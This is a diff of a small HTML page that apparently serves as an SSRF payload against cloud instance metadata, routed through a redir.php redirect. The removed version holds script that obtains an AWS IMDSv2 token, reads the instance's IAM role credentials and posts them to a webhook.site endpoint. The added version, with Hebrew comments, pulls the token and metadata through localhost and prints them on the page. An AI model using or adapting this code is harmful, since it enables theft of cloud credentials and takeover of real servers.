@@ -1,48 +1,36 @@
 <html>
-  <body>
-    <script>
-      async function fetchIMDS() {
-        try {
-          // 1. Token
-          let res1 = await fetch("http://13.221.230.104/redir.php?url=" + encodeURIComponent("http://169.254.169.254/latest/api/token"), {
-            method: "PUT",
-            headers: {
-              "X-aws-ec2-metadata-token-ttl-seconds": "21600"
-            }
-          });
-          let token = await res1.text();
+  <h1>Hey there!</h1>
+  <div id="tokenResult"></div>
+  <div id="metaDataResult"></div>
+  <div id="errorMsg"></div>
+  <script>
+    const tokenEndpoint = "http://localhost/redir.php?url=http://169.254.169.254/latest/api/token";
+    const metadataEndpoint = "http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/";
 
-          // 2. Get IAM role
-          let res2 = await fetch("http://13.221.230.104/redir.php?url=" + encodeURIComponent("http://169.254.169.254/latest/meta-data/iam/security-credentials/"), {
-            headers: {
-              "X-aws-ec2-metadata-token": token
-            }
-          });
-          let role = (await res2.text()).trim();
+    const tokenDiv = document.getElementById("tokenResult");
+    const metadataDiv = document.getElementById("metaDataResult");
+    const errorDiv = document.getElementById("errorMsg");
 
-          // 3. Get credentials
-          let res3 = await fetch("http://13.221.230.104/redir.php?url=" + encodeURIComponent(`http://169.254.169.254/latest/meta-data/iam/security-credentials/${role}`), {
-            headers: {
-              "X-aws-ec2-metadata-token": token
-            }
-          });
-          let creds = await res3.text();
+    let token = "";
 
-          // 4. Send to webhook
-          await fetch("https://webhook.site/565628b3-9556-8e01-88059325cb8d", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify({creds: creds})
-          });
+    try {
+      const xhr = new XMLHttpRequest();
 
-          console.log("Credentials sent successfully");
-        } catch(e) {
-          console.error("Error:", e);
-        }
-      }
-      fetchIMDS();
-    </script>
-  </body>
+      // בקשת הטוקן
+      xhr.open("PUT", tokenEndpoint, false);
+      xhr.setRequestHeader("X-aws-ec2-metadata-token-ttl-seconds", "21600");
+      xhr.send();
+      token = xhr.responseText;
+      tokenDiv.innerHTML = `<b>Token:</b> ${token}`;
+
+      // בקשת המטא-דאטה עם הטוקן
+      xhr.open("GET", metadataEndpoint, false);
+      xhr.setRequestHeader("X-aws-ec2-metadata-token", token);
+      xhr.send();
+      metadataDiv.innerHTML = `<b>Metadata:</b><br>${xhr.responseText.replace(/\n/g, "<br>")}`;
+
+    } catch (e) {
+      errorDiv.innerHTML = `<b>Error:</b> ${e.message}`;
+    }
+  </script>
 </html>
